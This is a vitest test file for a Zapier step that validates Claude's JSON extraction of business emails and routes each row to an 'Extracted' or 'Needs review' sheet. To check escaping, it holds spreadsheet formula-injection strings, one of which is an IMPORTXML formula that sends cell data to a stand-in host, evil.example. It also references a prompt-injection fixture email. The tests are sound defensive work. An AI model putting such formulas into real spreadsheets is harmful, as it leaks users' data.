import { readdirSync, readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { runZapierCode } from '../harness/zapier-code.js';

const STEP = readFileSync('zapier/code-steps/validate-and-route.js', 'utf8');
const readJson = (path: string) => JSON.parse(readFileSync(path, 'utf8'));
const expected: Record<string, { destination_sheet: string; doc_type: string; fields: Record<string, unknown> }> = readJson('fixtures/expected.json');
const ids = Object.keys(expected);

/** Runs the step for a fixture email with Claude's recorded answer, as the Zap would. */
async function runFixture(id: string) {
  const email = readJson(`fixtures/inputs/${id}.json`);
  const recorded = readJson(`fixtures/recorded/${id}.json`);
  return runZapierCode(STEP, {
    ai_output: recorded.text,
    email_from: email.from,
    email_subject: email.subject,
    email_received_at: email.received_at,
  });
}

/** Runs the step with a hand-written AI answer. */
const run = (answer: unknown) =>
  runZapierCode(STEP, {
    ai_output: typeof answer === 'string' ? answer : JSON.stringify(answer),
    email_from: 'a@b.co',
    email_subject: 'S',
    email_received_at: '2026-11-20T10:00:00Z',
  });

const order = (fields: Record<string, unknown>, extra: Record<string, unknown> = {}) => ({
  doc_type: 'order',
  fields: {
    customer_name: 'Ana',
    customer_email: 'ana@example.com',
    order_number: 'SO-1',
    order_date: '2026-11-20',
    items_summary: '1 x Tent',
    total: '$10.00',
    currency: 'USD',
    ...fields,
  },
  field_confidence: { customer_name: 0.9, customer_email: 0.9, order_number: 0.9, order_date: 0.9, items_summary: 0.9, total: 0.9, currency: 0.9 },
  overall_confidence: 0.9,
  ...extra,
});

describe('the step pasted into Zapier', () => {
  it('uses no require, import, fetch or process (Zapier free-plan safe)', () => {
    expect(STEP).not.toMatch(/\brequire\(|^\s*import\s|\bfetch\(|\bprocess\./m);
  });

  it('there is one recorded Claude answer per fixture', () => {
    expect(readdirSync('fixtures/recorded').map((f) => f.replace(/\.json$/, '')).sort()).toEqual([...ids].sort());
  });
});

describe('every sample email', () => {
  it.each(ids)('%s lands on the expected sheet with the expected values', async (id) => {
    const { output } = await runFixture(id);
    const want = expected[id];
    expect(output.destination_sheet, String(output.review_reasons)).toBe(want.destination_sheet);
    expect(output.doc_type).toBe(want.doc_type);
    for (const [field, value] of Object.entries(want.fields)) expect(output[field], field).toEqual(value);
  });

  it.each(ids)('%s runs well within the free-plan Code limit (< 100 ms)', async (id) => {
    expect((await runFixture(id)).ms).toBeLessThan(100);
  });

  it('records where each row came from', async () => {
    const { output } = await runFixture('doc-01-order');
    expect(output).toMatchObject({
      source_from: 'Maria Lopez <maria.lopez@example.com>',
      source_subject: 'Order SO-10482 confirmation',
      processed_at: '2026-11-18T09:14:00Z',
      needs_review: false,
      review_reasons: '',
    });
  });

  it('the injection email keeps its real total and goes to review', async () => {
    const { output } = await runFixture('doc-10-injection');
    expect(output.total).toBe(2400);
    expect(output.review_reasons).toMatch(/low overall confidence/);
  });

  it('keeps Arabic text byte-for-byte', async () => {
    const { output } = await runFixture('doc-12-arabic-enquiry');
    expect(output.contact_name).toBe('ليلى حداد');
    expect(output.company).toBe('مطاعم الواحة');
  });
});

describe('reading Claude\'s answer', () => {
  it('accepts a ```json fenced block', async () => {
    const { output } = await run('```json\n' + JSON.stringify(order({})) + '\n```');
    expect(output.destination_sheet).toBe('Extracted');
  });

  it('accepts leading and trailing prose around the JSON', async () => {
    const { output } = await run('Here is the extraction:\n' + JSON.stringify(order({})) + '\nLet me know if you need more.');
    expect(output.destination_sheet).toBe('Extracted');
  });

  it.each(['', 'null', '[]', '{"doc_type": 5}', '{"doc_type": "order", "fields": "x"}', 'Sorry, I cannot help with that.'])(
    'never throws on a broken answer (%j) and sends it to review',
    async (answer) => {
      const { output } = await run(answer);
      expect(output.destination_sheet).toBe('Needs review');
      expect(output.needs_review).toBe(true);
      expect(String(output.review_reasons).length).toBeGreaterThan(0);
    },
  );

  it('names a truncated answer as not valid JSON', async () => {
    const { output } = await run('{"doc_type": "order", "fields": {"total": "$1');
    expect(output.review_reasons).toBe('AI answer is not valid JSON');
  });

  it('sends doc_type other to review', async () => {
    const { output } = await run({ doc_type: 'other', fields: {}, field_confidence: {}, overall_confidence: 0.95 });
    expect(output).toMatchObject({ destination_sheet: 'Needs review', doc_type: 'other', review_reasons: 'not an order, invoice or enquiry' });
  });
});

describe('confidence', () => {
  it('sends a field under 0.7 to review, naming the field', async () => {
    const answer = order({});
    answer.field_confidence.order_number = 0.69;
    expect((await run(answer)).output.review_reasons).toBe('low confidence: order_number (0.69)');
  });

  it('accepts exactly 0.7', async () => {
    const answer = order({});
    answer.field_confidence.order_number = 0.7;
    expect((await run(answer)).output.destination_sheet).toBe('Extracted');
  });

  it('sends low overall confidence to review', async () => {
    expect((await run(order({}, { overall_confidence: 0.5 }))).output.review_reasons).toBe('low overall confidence (0.5)');
  });
});

describe('dates', () => {
  it.each([
    ['2026-04-03', '2026-04-03'],
    ['3 April 2026', '2026-04-03'],
    ['April 3, 2026', '2026-04-03'],
    ['15/10/2026', '2026-10-15'],
    ['10/15/2026', '2026-10-15'],
    ['3 abril 2026', '2026-04-03'],
  ])('normalises unambiguous %s to %s', async (raw, iso) => {
    const { output } = await run(order({ order_date: raw }));
    expect(output.order_date).toBe(iso);
    expect(output.destination_sheet).toBe('Extracted');
  });

  it.each(['03/04/2026', '3.4.2026', '04-03-2026'])('keeps ambiguous %s as written (as text) and asks a person', async (raw) => {
    const { output } = await run(order({ order_date: raw }));
    expect(output.order_date).toBe(`'${raw}`);
    expect(output.review_reasons).toBe('ambiguous date in order_date');
  });

  it('flags an unreadable date', async () => {
    expect((await run(order({ order_date: 'sometime next week' }))).output.review_reasons).toBe('unreadable date in order_date');
  });
});

describe('money', () => {
  it.each([
    ['$10.00', 'USD', 10, 'USD'],
    ['1,234.50', 'USD', 1234.5, 'USD'],
    ['€1.234,50', '€', 1234.5, 'EUR'],
    ['1.234,50 EUR', 'EUR', 1234.5, 'EUR'],
    ['£ 99', '£', 99, 'GBP'],
    ['99.00 USD', null, 99, 'USD'],
    ['1 040,00 €', '€', 1040, 'EUR'],
    [1500, 'GBP', 1500, 'GBP'],
  ])('parses %j (currency %j) as %d %s', async (total, currency, amount, code) => {
    const { output } = await run(order({ total, currency }));
    expect(output.total).toBe(amount);
    expect(output.currency).toBe(code);
    expect(output.destination_sheet).toBe('Extracted');
  });

  it('flags an unknown currency', async () => {
    expect((await run(order({ total: '10', currency: 'doubloons' }))).output.review_reasons).toBe('unknown currency');
  });

  it('flags a missing required total', async () => {
    const { output } = await run(order({ total: null }));
    expect(output.total).toBe('');
    expect(output.review_reasons).toBe('missing required field: total');
  });

  const invoice = (subtotal: unknown, tax: unknown, total: unknown) => ({
    doc_type: 'invoice',
    fields: { supplier_name: 'S', invoice_number: 'I-1', invoice_date: '2026-11-01', due_date: '2026-12-01', subtotal, tax, total, currency: 'GBP' },
    field_confidence: { supplier_name: 0.9, invoice_number: 0.9, invoice_date: 0.9, due_date: 0.9, subtotal: 0.9, tax: 0.9, total: 0.9, currency: 0.9 },
    overall_confidence: 0.9,
  });

  it('accepts invoice totals that add up (within 1 cent)', async () => {
    expect((await run(invoice('£100.00', '£20.00', '£120.00'))).output.destination_sheet).toBe('Extracted');
  });

  it('flags invoice totals that do not add up', async () => {
    expect((await run(invoice('£100.00', '£20.00', '£150.00'))).output.review_reasons).toBe("invoice totals don't add up (100 + 20 ≠ 150)");
  });
});

describe('spreadsheet safety', () => {
  it.each(['=HYPERLINK("x")', '+1-555-0100', '-sum(A1)', '@cmd'])('escapes formula-looking text %j so Sheets shows it as text', async (value) => {
    expect((await run(order({ customer_name: value }))).output.customer_name).toBe(`'${value}`);
  });

  it('lower-cases and validates emails', async () => {
    expect((await run(order({ customer_email: 'Ana@Example.COM' }))).output.customer_email).toBe('ana@example.com');
    expect((await run(order({ customer_email: 'not an email' }))).output.review_reasons).toBe('invalid email in customer_email');
  });

  it('combines several problems into one review reason line', async () => {
    const { output } = await run(order({ order_date: '03/04/2026', total: null }));
    expect(output.review_reasons).toBe('ambiguous date in order_date; missing required field: total');
  });
});

describe('final review: silent wrong values must not reach Extracted', () => {
  it.each(['€1.234', '1.234', '100.000', '€1,234'])('treats %j (one separator + 3 digits) as ambiguous, not a guess', async (total) => {
    const { output } = await run(order({ total, currency: total.startsWith('€') ? '€' : 'USD' }));
    expect(output.destination_sheet).toBe('Needs review');
    expect(output.review_reasons).toContain('ambiguous amount in total');
  });

  it('reads a comma as thousands when the currency writes it that way ($1,000 and 1,234 USD)', async () => {
    expect((await run(order({ total: '$1,000', currency: 'USD' }))).output.total).toBe(1000);
    expect((await run(order({ total: '1,234', currency: 'USD' }))).output.total).toBe(1234);
  });

  it('still reads 1,234.50 and 1.234,50 (both separators present) without review', async () => {
    expect((await run(order({ total: '1,234.50' }))).output.total).toBe(1234.5);
    expect((await run(order({ total: '1.234,50', currency: 'EUR' }))).output.total).toBe(1234.5);
  });

  it.each(['1e3', '1.5k', '12abc'])('rejects %j instead of deleting the letters', async (total) => {
    expect((await run(order({ total }))).output.review_reasons).toContain('unreadable amount in total');
  });

  it('keeps a third decimal (e.g. KWD) instead of rounding it away', async () => {
    expect((await run(order({ total: '12.345 KWD', currency: 'KWD' }))).output.total).toBe(12.345);
  });

  it.each([
    ['R$ 1.234,56', 'R$', 'BRL'],
    ['C$ 99.00', 'C$', 'CAD'],
    ['CA$ 99.00', 'CA$', 'CAD'],
    ['A$ 99.00', 'A$', 'AUD'],
    ['HK$ 99.00', 'HK$', 'HKD'],
  ])('reads %j as %s, not US dollars', async (total, currency, code) => {
    expect((await run(order({ total, currency }))).output.currency).toBe(code);
  });

  it('sends a currency field that contradicts the amount to review', async () => {
    const { output } = await run(order({ total: '€100.00', currency: 'USD' }));
    expect(output.destination_sheet).toBe('Needs review');
    expect(output.review_reasons).toContain('currencies disagree (USD, EUR)');
  });

  it.each(['=IMPORTXML("http://evil.example/?"&A1,"//x")', '+cmd', '@SUM(1)'])('escapes a formula-looking email subject %j', async (subject) => {
    const { output } = await runZapierCode(STEP, { ai_output: JSON.stringify(order({})), email_from: '=evil()', email_subject: subject, email_received_at: '2026-11-20T10:00:00Z' });
    expect(output.source_subject).toBe(`'${subject}`);
    expect(output.source_from).toBe("'=evil()");
  });

  it('escapes the subject on unreadable answers too', async () => {
    const { output } = await runZapierCode(STEP, { ai_output: 'nonsense', email_from: 'a@b.co', email_subject: '=1+1', email_received_at: '' });
    expect(output.source_subject).toBe("'=1+1");
  });

  it("keeps an ambiguous date as text Sheets won't re-parse", async () => {
    expect((await run(order({ order_date: '03/04/2026' }))).output.order_date).toBe("'03/04/2026");
  });
});
